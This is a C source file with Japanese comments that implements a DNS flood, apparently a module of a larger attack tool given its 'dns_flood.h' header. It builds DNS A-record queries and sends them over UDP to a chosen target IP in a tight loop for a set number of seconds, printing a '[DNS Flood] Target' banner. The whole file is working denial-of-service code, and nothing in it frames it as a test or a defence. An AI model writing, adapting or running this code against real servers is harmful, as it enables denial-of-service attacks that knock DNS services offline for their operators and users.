#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include "dns_flood.h"

#define DNS_PORT 53
#define PACKET_SIZE 512

// DNS ヘッダ (12バイト)
struct dns_header {
    unsigned short id;       // ID
    unsigned short flags;    // Flags
    unsigned short q_count;  // 質問数
    unsigned short ans;      // Answer RRs
    unsigned short auth;     // Authority RRs
    unsigned short add;      // Additional RRs
};

// DNS 質問部分
struct dns_question {
    unsigned short qtype;
    unsigned short qclass;
};

// ラベル形式に変換 "www.example.com" -> 3www7example3com0
void dns_format_name(unsigned char *dns, const char *host) {
    int lock = 0, i;
    char host_copy[256];
    strncpy(host_copy, host, sizeof(host_copy));
    strcat(host_copy, ".");

    for (i = 0; i < strlen(host_copy); i++) {
        if (host_copy[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host_copy[lock];
            }
            lock++;
        }
    }
    *dns++ = 0;
}

// 実際に UDP パケットで DNS クエリ送信
void send_dns_query(const char *target_ip, const char *domain) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DNS_PORT);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    unsigned char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct dns_header *dns = (struct dns_header *)packet;
    dns->id = htons(rand() % 65535);
    dns->flags = htons(0x0100); // 標準クエリ
    dns->q_count = htons(1);

    unsigned char *qname = packet + sizeof(struct dns_header);
    dns_format_name(qname, domain);

    struct dns_question *qinfo = (struct dns_question *)(qname + strlen((char*)qname) + 1);
    qinfo->qtype = htons(1);   // Type A
    qinfo->qclass = htons(1);  // Class IN

    int packet_len = sizeof(struct dns_header) + strlen((char*)qname) + 1 + sizeof(struct dns_question);

    sendto(sock, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest));

    close(sock);
}

// DNS Flood 本体
void dns_flood(const char *target_ip, const char *domain, int duration) {
    printf("[DNS Flood] Target: %s, Domain: %s for %d sec\n", target_ip, domain, duration);

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        send_dns_query(target_ip, domain);
    }
}
